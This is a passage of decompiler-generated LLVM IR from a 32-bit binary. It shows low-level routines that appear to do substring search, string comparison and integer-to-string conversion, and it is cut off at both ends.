  %v0_804f897 = phi i32 [ 0, %dec_label_pc_804f820 ], [ 134744072, %dec_label_pc_804f850 ]
  ret i32 %v0_804f897

; uselistorder directives
  uselistorder i32 %v3_804f83f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805016a, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8050345, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f892, { 1, 0 }
}

define i32 @function_804f8a0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f8a0:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_804f8b2 = load i8, i8* %tmp18, align 1
  %v3_804f8b2 = icmp eq i8 %v2_804f8b2, 0
  br i1 %v3_804f8b2, label %dec_label_pc_804f8c8, label %dec_label_pc_804f8b8

dec_label_pc_804f8b8:                             ; preds = %dec_label_pc_804f8a0, %dec_label_pc_804f8b8
  %v2_804f8b8 = phi i32 [ %v1_804f8bb, %dec_label_pc_804f8b8 ], [ 0, %dec_label_pc_804f8a0 ]
  %v1_804f8bb = add i32 %v2_804f8b8, 1
  %v2_804f8c2 = add i32 %v1_804f8bb, %arg3
  %v3_804f8c2 = inttoptr i32 %v2_804f8c2 to i8*
  %v4_804f8c2 = load i8, i8* %v3_804f8c2, align 1
  %v5_804f8c2 = icmp eq i8 %v4_804f8c2, 0
  %v1_804f8c6 = icmp eq i1 %v5_804f8c2, false
  br i1 %v1_804f8c6, label %dec_label_pc_804f8b8, label %dec_label_pc_804f8c8

dec_label_pc_804f8c8:                             ; preds = %dec_label_pc_804f8b8, %dec_label_pc_804f8a0
  %v2_804f8ff = phi i32 [ 0, %dec_label_pc_804f8a0 ], [ %v1_804f8bb, %dec_label_pc_804f8b8 ]
  %v4_804f8ce = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_804f8fc, label %dec_label_pc_804f8d6.preheader

dec_label_pc_804f8d6.preheader:                   ; preds = %dec_label_pc_804f8c8
  %v4_804f8d6.pre = load i32, i32* @ecx, align 4
  %v6_804f8d8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f8d6

dec_label_pc_804f8d6:                             ; preds = %dec_label_pc_804f8d6.preheader, %dec_label_pc_804f8f7
  %v0_804f8f7 = phi i32 [ %arg2, %dec_label_pc_804f8d6.preheader ], [ %v1_804f8f7, %dec_label_pc_804f8f7 ]
  %v6_804f8d8 = phi i32 [ %v6_804f8d8.pre, %dec_label_pc_804f8d6.preheader ], [ %v2_804f8f1, %dec_label_pc_804f8f7 ]
  %v0_804f905 = phi i32 [ 0, %dec_label_pc_804f8d6.preheader ], [ %v1_804f8d88, %dec_label_pc_804f8f7 ]
  %v4_804f8d6 = phi i32 [ %v4_804f8d6.pre, %dec_label_pc_804f8d6.preheader ], [ %v0_804f8f1, %dec_label_pc_804f8f7 ]
  %v0_804f8dc = phi i32 [ %v4_804f8ce, %dec_label_pc_804f8d6.preheader ], [ %v1_804f8dc, %dec_label_pc_804f8f7 ]
  %v1_804f8d6 = inttoptr i32 %v0_804f8dc to i8*
  %v2_804f8d6 = load i8, i8* %v1_804f8d6, align 1
  %v3_804f8d6 = zext i8 %v2_804f8d6 to i32
  %v5_804f8d6 = and i32 %v4_804f8d6, -256
  %v6_804f8d6 = or i32 %v3_804f8d6, %v5_804f8d6
  store i32 %v6_804f8d6, i32* @ecx, align 4
  %v2_804f8d8 = add i32 %v0_804f905, %arg3
  %v3_804f8d8 = inttoptr i32 %v2_804f8d8 to i8*
  %v4_804f8d8 = load i8, i8* %v3_804f8d8, align 1
  %v5_804f8d8 = zext i8 %v4_804f8d8 to i32
  %v7_804f8d8 = and i32 %v6_804f8d8, -256
  %v8_804f8d8 = or i32 %v5_804f8d8, %v7_804f8d8
  %v1_804f8dc = add i32 %v0_804f8dc, 1
  %v1_804f8dd = add i8 %v2_804f8d6, -65
  %v8_804f8e2 = icmp ugt i8 %v1_804f8dd, 25
  br i1 %v8_804f8e2, label %dec_label_pc_804f8e7, label %dec_label_pc_804f8e4

dec_label_pc_804f8e4:                             ; preds = %dec_label_pc_804f8d6
  %v1_804f8e4 = or i32 %v6_804f8d6, 96
  store i32 %v1_804f8e4, i32* @ecx, align 4
  br label %dec_label_pc_804f8e7

dec_label_pc_804f8e7:                             ; preds = %dec_label_pc_804f8d6, %dec_label_pc_804f8e4
  %v0_804f8f1 = phi i32 [ %v6_804f8d6, %dec_label_pc_804f8d6 ], [ %v1_804f8e4, %dec_label_pc_804f8e4 ]
  %v1_804f8e7 = add i8 %v4_804f8d8, -65
  %v8_804f8ec = icmp ugt i8 %v1_804f8e7, 25
  br i1 %v8_804f8ec, label %dec_label_pc_804f8f1, label %dec_label_pc_804f8ee

dec_label_pc_804f8ee:                             ; preds = %dec_label_pc_804f8e7
  %v1_804f8ee = or i32 %v8_804f8d8, 96
  br label %dec_label_pc_804f8f1

dec_label_pc_804f8f1:                             ; preds = %dec_label_pc_804f8e7, %dec_label_pc_804f8ee
  %v2_804f8f1 = phi i32 [ %v8_804f8d8, %dec_label_pc_804f8e7 ], [ %v1_804f8ee, %dec_label_pc_804f8ee ]
  %v1_804f8f1 = trunc i32 %v0_804f8f1 to i8
  %v3_804f8f1 = trunc i32 %v2_804f8f1 to i8
  %v15_804f8f1 = icmp eq i8 %v1_804f8f1, %v3_804f8f1
  br i1 %v15_804f8f1, label %dec_label_pc_804f905, label %dec_label_pc_804f8f5

dec_label_pc_804f8f5:                             ; preds = %dec_label_pc_804f8f1
  br label %dec_label_pc_804f8f7

dec_label_pc_804f8f7:                             ; preds = %dec_label_pc_804f905, %dec_label_pc_804f8f5
  %v1_804f8d88 = phi i32 [ %v1_804f905, %dec_label_pc_804f905 ], [ 0, %dec_label_pc_804f8f5 ]
  %v1_804f8f7 = add i32 %v0_804f8f7, -1
  %tmp26 = icmp slt i32 %v1_804f8f7, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_804f8d6, label %dec_label_pc_804f8fc

dec_label_pc_804f8fc:                             ; preds = %dec_label_pc_804f8f7, %dec_label_pc_804f8c8
  store i32 %v2_804f8ff, i32* @edx, align 4
  ret i32 -1

dec_label_pc_804f905:                             ; preds = %dec_label_pc_804f8f1
  %v1_804f905 = add i32 %v0_804f905, 1
  %v14_804f906 = icmp eq i32 %v2_804f8ff, %v1_804f905
  %v1_804f909 = icmp eq i1 %v14_804f906, false
  br i1 %v1_804f909, label %dec_label_pc_804f8f7, label %dec_label_pc_804f90b

dec_label_pc_804f90b:                             ; preds = %dec_label_pc_804f905
  store i32 %v4_804f8ce, i32* @ecx, align 4
  %v2_804f911 = sub i32 %v1_804f8dc, %v4_804f8ce
  store i32 %v2_804f8ff, i32* @edx, align 4
  ret i32 %v2_804f911

; uselistorder directives
  uselistorder i32 %v1_804f8f7, { 1, 0 }
  uselistorder i32 %v0_804f905, { 1, 0 }
  uselistorder i32 %v4_804f8ce, { 2, 1, 0 }
  uselistorder i32 %v2_804f8ff, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804f8f1, { 1, 0 }
  uselistorder label %dec_label_pc_804f8e7, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d6, { 1, 0 }
  uselistorder label %dec_label_pc_804f8b8, { 1, 0 }
}

define i32 @function_804f920() local_unnamed_addr {
dec_label_pc_804f920:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_804f922 = ptrtoint i8* %tmp13 to i32
  %v4_804f928 = ptrtoint i8* %tmp to i32
  %v2_804f92c = load i8, i8* %tmp13, align 1
  %v3_804f92c = icmp eq i8 %v2_804f92c, 0
  br i1 %v3_804f92c, label %dec_label_pc_804f938, label %dec_label_pc_804f931

dec_label_pc_804f931:                             ; preds = %dec_label_pc_804f920, %dec_label_pc_804f931
  %v0_804f931 = phi i32 [ %v1_804f931, %dec_label_pc_804f931 ], [ 0, %dec_label_pc_804f920 ]
  %v1_804f931 = add i32 %v0_804f931, 1
  %v2_804f932 = add i32 %v1_804f931, %v4_804f922
  %v3_804f932 = inttoptr i32 %v2_804f932 to i8*
  %v4_804f932 = load i8, i8* %v3_804f932, align 1
  %v5_804f932 = icmp eq i8 %v4_804f932, 0
  %v1_804f936 = icmp eq i1 %v5_804f932, false
  br i1 %v1_804f936, label %dec_label_pc_804f931, label %dec_label_pc_804f938

dec_label_pc_804f938:                             ; preds = %dec_label_pc_804f931, %dec_label_pc_804f920
  %v0_804f949 = phi i32 [ 0, %dec_label_pc_804f920 ], [ %v1_804f931, %dec_label_pc_804f931 ]
  %v2_804f93a = load i8, i8* %tmp, align 1
  %v3_804f93a = icmp eq i8 %v2_804f93a, 0
  br i1 %v3_804f93a, label %dec_label_pc_804f947, label %dec_label_pc_804f940

dec_label_pc_804f940:                             ; preds = %dec_label_pc_804f938, %dec_label_pc_804f940
  %v0_804f940 = phi i32 [ %v1_804f940, %dec_label_pc_804f940 ], [ 0, %dec_label_pc_804f938 ]
  %v1_804f940 = add i32 %v0_804f940, 1
  %v2_804f941 = add i32 %v1_804f940, %v4_804f928
  %v3_804f941 = inttoptr i32 %v2_804f941 to i8*
  %v4_804f941 = load i8, i8* %v3_804f941, align 1
  %v5_804f941 = icmp eq i8 %v4_804f941, 0
  %v1_804f945 = icmp eq i1 %v5_804f941, false
  br i1 %v1_804f945, label %dec_label_pc_804f940, label %dec_label_pc_804f947

dec_label_pc_804f947:                             ; preds = %dec_label_pc_804f940, %dec_label_pc_804f938
  %v0_804f947 = phi i32 [ 0, %dec_label_pc_804f938 ], [ %v1_804f940, %dec_label_pc_804f940 ]
  store i32 %v0_804f947, i32* @edx, align 4
  %v12_804f949 = icmp eq i32 %v0_804f949, %v0_804f947
  br i1 %v12_804f949, label %dec_label_pc_804f954.preheader, label %dec_label_pc_804f94d

dec_label_pc_804f954.preheader:                   ; preds = %dec_label_pc_804f947
  %v1_804f95417 = add i32 %v0_804f949, -1
  store i32 %v1_804f95417, i32* @edx, align 4
  %v10_804f95518 = icmp eq i32 %v0_804f949, 0
  br i1 %v10_804f95518, label %dec_label_pc_804f962, label %dec_label_pc_804f95a

dec_label_pc_804f94d:                             ; preds = %dec_label_pc_804f95a, %dec_label_pc_804f947
  ret i32 0

dec_label_pc_804f952:                             ; preds = %dec_label_pc_804f95a
  %v3_804f95a = zext i8 %v2_804f95a to i32
  %v5_804f95a = and i32 %v4_804f95a20, -256
  %v6_804f95a = or i32 %v3_804f95a, %v5_804f95a
  %v1_804f952 = add i32 %v0_804f95221, 1
  %v1_804f953 = add i32 %v0_804f95319, 1
  %v1_804f954 = add i32 %v1_804f95422, -1
  store i32 %v1_804f954, i32* @edx, align 4
  %v10_804f955 = icmp eq i32 %v1_804f95422, 0
  br i1 %v10_804f955, label %dec_label_pc_804f962, label %dec_label_pc_804f95a

dec_label_pc_804f95a:                             ; preds = %dec_label_pc_804f954.preheader, %dec_label_pc_804f952
  %v1_804f95422 = phi i32 [ %v1_804f954, %dec_label_pc_804f952 ], [ %v1_804f95417, %dec_label_pc_804f954.preheader ]
  %v0_804f95221 = phi i32 [ %v1_804f952, %dec_label_pc_804f952 ], [ %v4_804f922, %dec_label_pc_804f954.preheader ]
  %v4_804f95a20 = phi i32 [ %v6_804f95a, %dec_label_pc_804f952 ], [ %v0_804f949, %dec_label_pc_804f954.preheader ]
  %v0_804f95319 = phi i32 [ %v1_804f953, %dec_label_pc_804f952 ], [ %v4_804f928, %dec_label_pc_804f954.preheader ]
  %v1_804f95a = inttoptr i32 %v0_804f95221 to i8*
  %v2_804f95a = load i8, i8* %v1_804f95a, align 1
  %v3_804f95c = inttoptr i32 %v0_804f95319 to i8*
  %v4_804f95c = load i8, i8* %v3_804f95c, align 1
  %v15_804f95c = icmp eq i8 %v2_804f95a, %v4_804f95c
  br i1 %v15_804f95c, label %dec_label_pc_804f952, label %dec_label_pc_804f94d

dec_label_pc_804f962:                             ; preds = %dec_label_pc_804f952, %dec_label_pc_804f954.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_804f95422, { 1, 0 }
  uselistorder i32 %v0_804f949, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804f95a, { 1, 0 }
  uselistorder label %dec_label_pc_804f940, { 1, 0 }
  uselistorder label %dec_label_pc_804f931, { 1, 0 }
}

define i32 @function_804f970() local_unnamed_addr {
dec_label_pc_804f970:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_804f972 = ptrtoint i8* %tmp14 to i32
  %v4_804f978 = ptrtoint i8* %tmp13 to i32
  %v2_804f980 = load i8, i8* %tmp14, align 1
  %v3_804f980 = icmp eq i8 %v2_804f980, 0
  br i1 %v3_804f980, label %dec_label_pc_804f98c, label %dec_label_pc_804f985

dec_label_pc_804f985:                             ; preds = %dec_label_pc_804f970, %dec_label_pc_804f985
  %v0_804f985 = phi i32 [ %v1_804f985, %dec_label_pc_804f985 ], [ 0, %dec_label_pc_804f970 ]
  %v1_804f985 = add i32 %v0_804f985, 1
  %v2_804f986 = add i32 %v1_804f985, %v4_804f972
  %v3_804f986 = inttoptr i32 %v2_804f986 to i8*
  %v4_804f986 = load i8, i8* %v3_804f986, align 1
  %v5_804f986 = icmp eq i8 %v4_804f986, 0
  %v1_804f98a = icmp eq i1 %v5_804f986, false
  br i1 %v1_804f98a, label %dec_label_pc_804f985, label %dec_label_pc_804f98c

dec_label_pc_804f98c:                             ; preds = %dec_label_pc_804f985, %dec_label_pc_804f970
  %v1_804f99a = phi i32 [ 0, %dec_label_pc_804f970 ], [ %v1_804f985, %dec_label_pc_804f985 ]
  %v2_804f98e = load i8, i8* %tmp13, align 1
  %v3_804f98e = icmp eq i8 %v2_804f98e, 0
  br i1 %v3_804f98e, label %dec_label_pc_804f99a, label %dec_label_pc_804f993

dec_label_pc_804f993:                             ; preds = %dec_label_pc_804f98c, %dec_label_pc_804f993
  %v0_804f993 = phi i32 [ %v1_804f993, %dec_label_pc_804f993 ], [ 0, %dec_label_pc_804f98c ]
  %v1_804f993 = add i32 %v0_804f993, 1
  %v2_804f994 = add i32 %v1_804f993, %v4_804f978
  %v3_804f994 = inttoptr i32 %v2_804f994 to i8*
  %v4_804f994 = load i8, i8* %v3_804f994, align 1
  %v5_804f994 = icmp eq i8 %v4_804f994, 0
  %v1_804f998 = icmp eq i1 %v5_804f994, false
  br i1 %v1_804f998, label %dec_label_pc_804f993, label %dec_label_pc_804f99a

dec_label_pc_804f99a:                             ; preds = %dec_label_pc_804f993, %dec_label_pc_804f98c
  %v1_804f99e = phi i32 [ 0, %dec_label_pc_804f98c ], [ %v1_804f993, %dec_label_pc_804f993 ]
  %v8_804f99c = icmp sgt i32 %tmp, %v1_804f99a
  br i1 %v8_804f99c, label %dec_label_pc_804f9a2, label %dec_label_pc_804f99e

dec_label_pc_804f99e:                             ; preds = %dec_label_pc_804f99a
  %v7_804f9a0 = icmp sgt i32 %tmp, %v1_804f99e
  br i1 %v7_804f9a0, label %dec_label_pc_804f9a2, label %dec_label_pc_804f9a9.preheader

dec_label_pc_804f9a9.preheader:                   ; preds = %dec_label_pc_804f99e
  %v10_804f9aa19 = icmp eq i32 %tmp, 0
  br i1 %v10_804f9aa19, label %dec_label_pc_804f9a4, label %dec_label_pc_804f9af

dec_label_pc_804f9a2:                             ; preds = %dec_label_pc_804f9af, %dec_label_pc_804f99e, %dec_label_pc_804f99a
  br label %dec_label_pc_804f9a4

dec_label_pc_804f9a4:                             ; preds = %dec_label_pc_804f9a9.preheader, %dec_label_pc_804f9a7, %dec_label_pc_804f9a2
  %storemerge = phi i32 [ 0, %dec_label_pc_804f9a2 ], [ 1, %dec_label_pc_804f9a7 ], [ 1, %dec_label_pc_804f9a9.preheader ]
  ret i32 %storemerge

dec_label_pc_804f9a7:                             ; preds = %dec_label_pc_804f9af
  %v3_804f9af = zext i8 %v2_804f9af to i32
  %v5_804f9af = and i32 %v4_804f9af21, -256
  %v6_804f9af = or i32 %v3_804f9af, %v5_804f9af
  %v1_804f9a7 = add i32 %v0_804f9a722, 1
  %v1_804f9a8 = add i32 %v0_804f9a820, 1
  %v10_804f9aa = icmp eq i32 %v1_804f9a923, 0
  br i1 %v10_804f9aa, label %dec_label_pc_804f9a4, label %dec_label_pc_804f9af

dec_label_pc_804f9af:                             ; preds = %dec_label_pc_804f9a9.preheader, %dec_label_pc_804f9a7
  %v1_804f9a923.in = phi i32 [ %v1_804f9a923, %dec_label_pc_804f9a7 ], [ %tmp, %dec_label_pc_804f9a9.preheader ]
  %v0_804f9a722 = phi i32 [ %v1_804f9a7, %dec_label_pc_804f9a7 ], [ %v4_804f972, %dec_label_pc_804f9a9.preheader ]
  %v4_804f9af21 = phi i32 [ %v6_804f9af, %dec_label_pc_804f9a7 ], [ %v1_804f99e, %dec_label_pc_804f9a9.preheader ]
  %v0_804f9a820 = phi i32 [ %v1_804f9a8, %dec_label_pc_804f9a7 ], [ %v4_804f978, %dec_label_pc_804f9a9.preheader ]
  %v1_804f9a923 = add i32 %v1_804f9a923.in, -1
  %v1_804f9af = inttoptr i32 %v0_804f9a722 to i8*
  %v2_804f9af = load i8, i8* %v1_804f9af, align 1
  %v3_804f9b1 = inttoptr i32 %v0_804f9a820 to i8*
  %v4_804f9b1 = load i8, i8* %v3_804f9b1, align 1
  %v15_804f9b1 = icmp eq i8 %v2_804f9af, %v4_804f9b1
  br i1 %v15_804f9b1, label %dec_label_pc_804f9a7, label %dec_label_pc_804f9a2

; uselistorder directives
  uselistorder label %dec_label_pc_804f9af, { 1, 0 }
  uselistorder label %dec_label_pc_804f9a4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f993, { 1, 0 }
  uselistorder label %dec_label_pc_804f985, { 1, 0 }
}

define i32 @function_804f9c0(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f9c0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_804f9c4 = ptrtoint i32* %stack_var_-64 to i32
  %v4_804f9cb = trunc i64 %arg1 to i32
  store i32 %v4_804f9cb, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_804f9d3 = icmp eq i32 %arg3, 0
  br i1 %v2_804f9d3, label %dec_label_pc_804fa40, label %dec_label_pc_804f9d7

dec_label_pc_804f9d7:                             ; preds = %dec_label_pc_804f9c0
  %v2_804f9d7 = icmp eq i32 %v4_804f9cb, 0
  %v3_804f9d7 = icmp slt i32 %v4_804f9cb, 0
  br i1 %v2_804f9d7, label %dec_label_pc_804fa50, label %dec_label_pc_804f9db

dec_label_pc_804f9db:                             ; preds = %dec_label_pc_804f9d7
  %v9_804f9e0 = icmp eq i32 %arg2, 10
  br i1 %v9_804f9e0, label %dec_label_pc_804fa6d, label %dec_label_pc_804f9e9

dec_label_pc_804f9e9:                             ; preds = %dec_label_pc_804fa6d, %dec_label_pc_804f9db
  br label %dec_label_pc_804f9ed

dec_label_pc_804f9ed:                             ; preds = %dec_label_pc_804fa75, %dec_label_pc_804f9e9
  %storemerge35 = phi i32 [ %v4_804f9cb, %dec_label_pc_804f9e9 ], [ %v1_804fa77, %dec_label_pc_804fa75 ]
  %v0_804f9f45 = phi i32 [ %v4_804f9cb, %dec_label_pc_804f9e9 ], [ %v1_804fa77, %dec_label_pc_804fa75 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804f9e9 ], [ 1, %dec_label_pc_804fa75 ]
  store i32 %storemerge35, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9f2

dec_label_pc_804f9f2:                             ; preds = %dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge, %dec_label_pc_804f9ed
  %v2_804fa03 = phi i32 [ %v2_804fa03.pre, %dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge ], [ %v12_804f9c4, %dec_label_pc_804f9ed ]
  %v3_804fa03 = phi i32 [ %v1_804fa0b, %dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge ], [ 32, %dec_label_pc_804f9ed ]
  %v0_804f9f6 = phi i32 [ %v0_804fa0c, %dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge ], [ %arg2, %dec_label_pc_804f9ed ]
  %v0_804f9f4 = phi i32 [ %div20, %dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge ], [ %v0_804f9f45, %dec_label_pc_804f9ed ]
  %tmp32 = urem i32 %v0_804f9f4, %v0_804f9f6
  %v7_804f9fe = icmp sgt i32 %tmp32, 9
  %v1_804fa00.v1_804f9fb.v = select i1 %v7_804f9fe, i32 55, i32 48
  %v1_804fa00.v1_804f9fb = add i32 %v1_804fa00.v1_804f9fb.v, %tmp32
  %v1_804fa03 = trunc i32 %v1_804fa00.v1_804f9fb to i8
  %v4_804fa03 = add i32 %v3_804fa03, 14
  %v5_804fa03 = add i32 %v4_804fa03, %v2_804fa03
  %v6_804fa03 = inttoptr i32 %v5_804fa03 to i8*
  store i8 %v1_804fa03, i8* %v6_804fa03, align 1
  %v0_804fa09 = load i32, i32* %ecx.global-to-local, align 4
  %v0_804fa0b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa0b = add i32 %v0_804fa0b, -1
  store i32 %v1_804fa0b, i32* %ebx.global-to-local, align 4
  %v0_804fa0c = load i32, i32* %esi.global-to-local, align 4
  %div20 = udiv i32 %v0_804fa09, %v0_804fa0c
  store i32 %div20, i32* %eax.global-to-local, align 4
  %tmp33 = urem i32 %v0_804fa09, %v0_804fa0c
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  store i32 %div20, i32* %ecx.global-to-local, align 4
  %v1_804fa10 = icmp ugt i32 %v0_804fa0c, %v0_804fa09
  %v1_804fa12 = icmp eq i1 %v1_804fa10, false
  br i1 %v1_804fa12, label %dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge, label %dec_label_pc_804fa14

dec_label_pc_804f9f2.dec_label_pc_804f9f2_crit_edge: ; preds = %dec_label_pc_804f9f2
  %v2_804fa03.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f9f2

dec_label_pc_804fa14:                             ; preds = %dec_label_pc_804f9f2
  %v0_804fa14 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fa14 = icmp eq i32 %v0_804fa14, 0
  %v1_804fa16 = icmp eq i1 %v1_804fa14, false
  br i1 %v1_804fa16, label %dec_label_pc_804fa66, label %dec_label_pc_804fa18

dec_label_pc_804fa18:                             ; preds = %dec_label_pc_804fa14
  store i32 %v0_804fa0b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa19

dec_label_pc_804fa19:                             ; preds = %dec_label_pc_804fa66, %dec_label_pc_804fa18
  %v1_804fa19 = phi i32 [ %v1_804fa19.pre, %dec_label_pc_804fa66 ], [ %v0_804fa0b, %dec_label_pc_804fa18 ]
  %v0_804fa19 = load i32, i32* @esp, align 4
  %v2_804fa19 = add i32 %v1_804fa19, 14
  %v3_804fa19 = add i32 %v2_804fa19, %v0_804fa19
  store i32 %v3_804fa19, i32* %eax.global-to-local, align 4
  %v1_804fa1d = inttoptr i32 %v3_804fa19 to i8*
  %v2_804fa1d = load i8, i8* %v1_804fa1d, align 1
  %v3_804fa1d = icmp eq i8 %v2_804fa1d, 0
  br i1 %v3_804fa1d, label %dec_label_pc_804fa85, label %dec_label_pc_804fa22

dec_label_pc_804fa22:                             ; preds = %dec_label_pc_804fa19
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fa24

dec_label_pc_804fa24:                             ; preds = %dec_label_pc_804fa24, %dec_label_pc_804fa22
  %v0_804fa24 = phi i32 [ %v1_804fa24, %dec_label_pc_804fa24 ], [ 0, %dec_label_pc_804fa22 ]
  %v1_804fa24 = add i32 %v0_804fa24, 1
  store i32 %v1_804fa24, i32* %ecx.global-to-local, align 4
  %v2_804fa25 = add i32 %v1_804fa24, %v3_804fa19
  %v3_804fa25 = inttoptr i32 %v2_804fa25 to i8*
  %v4_804fa25 = load i8, i8* %v3_804fa25, align 1
  %v5_804fa25 = icmp eq i8 %v4_804fa25, 0
  %v1_804fa29 = icmp eq i1 %v5_804fa25, false
  br i1 %v1_804fa29, label %dec_label_pc_804fa24, label %dec_label_pc_804fa2b

dec_label_pc_804fa2b:                             ; preds = %dec_label_pc_804fa24
  %v10_804fa2b = icmp eq i32 %v0_804fa24, -2
  br i1 %v10_804fa2b, label %dec_label_pc_804fa40, label %dec_label_pc_804fa30

dec_label_pc_804fa30:                             ; preds = %dec_label_pc_804fa2b
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_804fa19, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fa34

dec_label_pc_804fa34:                             ; preds = %dec_label_pc_804fa85, %dec_label_pc_804fa30, %dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge
  %v2_804fa37 = phi i32 [ %v1_804fa3a, %dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge ], [ %arg3, %dec_label_pc_804fa30 ], [ %arg3, %dec_label_pc_804fa85 ]
  %v0_804fa36 = phi i32 [ %v0_804fa3b, %dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge ], [ %v1_804fa24, %dec_label_pc_804fa30 ], [ 0, %dec_label_pc_804fa85 ]
  %v4_804fa34 = phi i32 [ %v4_804fa34.pre, %dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge ], [ %v3_804fa19, %dec_label_pc_804fa30 ], [ %v3_804fa19, %dec_label_pc_804fa85 ]
  %v0_804fa34 = phi i32 [ %v1_804fa39, %dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge ], [ %v3_804fa19, %dec_label_pc_804fa30 ], [ %v3_804fa19, %dec_label_pc_804fa85 ]
  %v1_804fa34 = inttoptr i32 %v0_804fa34 to i8*
  %v2_804fa34 = load i8, i8* %v1_804fa34, align 1
  %v3_804fa34 = zext i8 %v2_804fa34 to i32
  %v5_804fa34 = and i32 %v4_804fa34, -256
  %v6_804fa34 = or i32 %v3_804fa34, %v5_804fa34
  store i32 %v6_804fa34, i32* %eax.global-to-local, align 4
  %v1_804fa36 = add i32 %v0_804fa36, -1
  store i32 %v1_804fa36, i32* %ecx.global-to-local, align 4
  %v3_804fa37 = inttoptr i32 %v2_804fa37 to i8*
  store i8 %v2_804fa34, i8* %v3_804fa37, align 1
  %v0_804fa39 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa39 = add i32 %v0_804fa39, 1
  store i32 %v1_804fa39, i32* %edx.global-to-local, align 4
  %v0_804fa3a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa3a = add i32 %v0_804fa3a, 1
  store i32 %v1_804fa3a, i32* %ebx.global-to-local, align 4
  %v0_804fa3b = load i32, i32* %ecx.global-to-local, align 4
  %v10_804fa3b = icmp eq i32 %v0_804fa3b, -1
  %v1_804fa3e = icmp eq i1 %v10_804fa3b, false
  br i1 %v1_804fa3e, label %dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge, label %dec_label_pc_804fa40.loopexit

dec_label_pc_804fa34.dec_label_pc_804fa34_crit_edge: ; preds = %dec_label_pc_804fa34
  %v4_804fa34.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa34

dec_label_pc_804fa40.loopexit:                    ; preds = %dec_label_pc_804fa34
  br label %dec_label_pc_804fa40

dec_label_pc_804fa40:                             ; preds = %dec_label_pc_804fa40.loopexit, %dec_label_pc_804fa2b, %dec_label_pc_804f9c0
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_804fa50:                             ; preds = %dec_label_pc_804f9d7
  store i8 48, i8* %tmp25, align 1
  %v2_804fa53 = add i32 %arg3, 1
  %v3_804fa53 = inttoptr i32 %v2_804fa53 to i8*
  store i8 0, i8* %v3_804fa53, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_804fa66:                             ; preds = %dec_label_pc_804fa14
  %v0_804fa66 = load i32, i32* @esp, align 4
  %v2_804fa66 = add i32 %v0_804fa0b, 13
  %v3_804fa66 = add i32 %v2_804fa66, %v0_804fa66
  %v4_804fa66 = inttoptr i32 %v3_804fa66 to i8*
  store i8 45, i8* %v4_804fa66, align 1
  %v1_804fa19.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa19

dec_label_pc_804fa6d:                             ; preds = %dec_label_pc_804f9db
  %v1_804fa6f = icmp eq i1 %v3_804f9d7, false
  br i1 %v1_804fa6f, label %dec_label_pc_804f9e9, label %dec_label_pc_804fa75

dec_label_pc_804fa75:                             ; preds = %dec_label_pc_804fa6d
  %v1_804fa77 = sub i32 0, %v4_804f9cb
  br label %dec_label_pc_804f9ed

dec_label_pc_804fa85:                             ; preds = %dec_label_pc_804fa19
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_804fa19, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
